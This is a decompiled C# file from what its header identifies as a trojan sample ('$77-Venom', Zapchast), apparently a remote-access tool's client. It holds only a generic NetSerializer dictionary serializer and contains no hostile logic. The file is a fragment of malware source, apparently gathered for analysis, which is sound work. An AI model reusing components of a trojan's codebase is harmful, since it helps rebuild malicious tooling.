// Decompiled with JetBrains decompiler
// Type: xClient.Core.NetSerializer.TypeSerializers.DictionarySerializer
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;

namespace xClient.Core.NetSerializer.TypeSerializers
{
  public class DictionarySerializer : IStaticTypeSerializer, ITypeSerializer
  {
    public bool Handles(Type type) => type.IsGenericType && type.GetGenericTypeDefinition() == typeof (Dictionary<,>);

    public IEnumerable<Type> GetSubtypes(Type type)
    {
      yield return typeof (KeyValuePair<,>).MakeGenericType(type.GetGenericArguments()).MakeArrayType();
    }

    public void GetStaticMethods(Type type, out MethodInfo writer, out MethodInfo reader)
    {
      Type genType = type.IsGenericType ? type.GetGenericTypeDefinition() : throw new Exception();
      Type type1 = this.GetType();
      writer = DictionarySerializer.GetGenWriter(type1, genType);
      reader = DictionarySerializer.GetGenReader(type1, genType);
      Type[] genericArguments = type.GetGenericArguments();
      writer = writer.MakeGenericMethod(genericArguments);
      reader = reader.MakeGenericMethod(genericArguments);
    }

    private static MethodInfo GetGenWriter(Type containerType, Type genType)
    {
      foreach (MethodInfo genWriter in ((IEnumerable<MethodInfo>) containerType.GetMethods(BindingFlags.Static | BindingFlags.Public)).Where<MethodInfo>((Func<MethodInfo, bool>) (mi => mi.IsGenericMethod && mi.Name == "WritePrimitive")))
      {
        ParameterInfo[] parameters = genWriter.GetParameters();
        if (parameters.Length == 3 && !(parameters[1].ParameterType != typeof (Stream)))
        {
          Type parameterType = parameters[2].ParameterType;
          if (parameterType.IsGenericType)
          {
            Type genericTypeDefinition = parameterType.GetGenericTypeDefinition();
            if (genType == genericTypeDefinition)
              return genWriter;
          }
        }
      }
      return (MethodInfo) null;
    }

    private static MethodInfo GetGenReader(Type containerType, Type genType)
    {
      foreach (MethodInfo genReader in ((IEnumerable<MethodInfo>) containerType.GetMethods(BindingFlags.Static | BindingFlags.Public)).Where<MethodInfo>((Func<MethodInfo, bool>) (mi => mi.IsGenericMethod && mi.Name == "ReadPrimitive")))
      {
        ParameterInfo[] parameters = genReader.GetParameters();
        if (parameters.Length == 3 && !(parameters[1].ParameterType != typeof (Stream)))
        {
          Type parameterType = parameters[2].ParameterType;
          if (parameterType.IsByRef)
          {
            Type elementType = parameterType.GetElementType();
            if (elementType.IsGenericType)
            {
              Type genericTypeDefinition = elementType.GetGenericTypeDefinition();
              if (genType == genericTypeDefinition)
                return genReader;
            }
          }
        }
      }
      return (MethodInfo) null;
    }

    public static void WritePrimitive<TKey, TValue>(
      Serializer serializer,
      Stream stream,
      Dictionary<TKey, TValue> value)
    {
      KeyValuePair<TKey, TValue>[] data = new KeyValuePair<TKey, TValue>[value.Count];
      int num = 0;
      foreach (KeyValuePair<TKey, TValue> keyValuePair in value)
        data[num++] = keyValuePair;
      serializer.Serialize(stream, (object) data);
    }

    public static void ReadPrimitive<TKey, TValue>(
      Serializer serializer,
      Stream stream,
      out Dictionary<TKey, TValue> value)
    {
      KeyValuePair<TKey, TValue>[] keyValuePairArray = (KeyValuePair<TKey, TValue>[]) serializer.Deserialize(stream);
      value = new Dictionary<TKey, TValue>(keyValuePairArray.Length);
      foreach (KeyValuePair<TKey, TValue> keyValuePair in keyValuePairArray)
        value.Add(keyValuePair.Key, keyValuePair.Value);
    }
  }
}
